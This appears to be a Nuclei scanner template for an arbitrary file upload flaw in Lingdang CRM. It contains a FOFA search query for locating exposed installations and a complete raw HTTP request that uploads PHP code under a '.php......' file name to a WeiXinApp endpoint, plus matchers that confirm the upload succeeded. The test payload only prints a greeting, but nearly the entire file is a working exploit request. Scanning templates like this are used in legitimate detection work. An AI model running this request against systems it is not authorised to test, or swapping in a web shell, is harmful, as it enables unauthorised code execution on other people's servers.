id: lingdang-crm-uploadfile

info:
  name: Lingdang crm uploadfile
  author: proud
  severity: high
  description: |
    灵当crm任意文件上传
  metadata:
    verified: true
    fofa-query: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.ba se.js")
  tags: crm, file-upload

http:
  - raw:
      - |
        POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename=221.php......&callednumber=&sessionvalue=ca6ee37ed4ea2c709b2d36d1349cacff HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        Connection: close

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="uploaded_file"; filename="123321.avi"
        Content-Type: image/jpeg

        <?php
        print "Hello, World!";
        ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, 'success')"
          - "contains(body, 'filename')"
        condition: and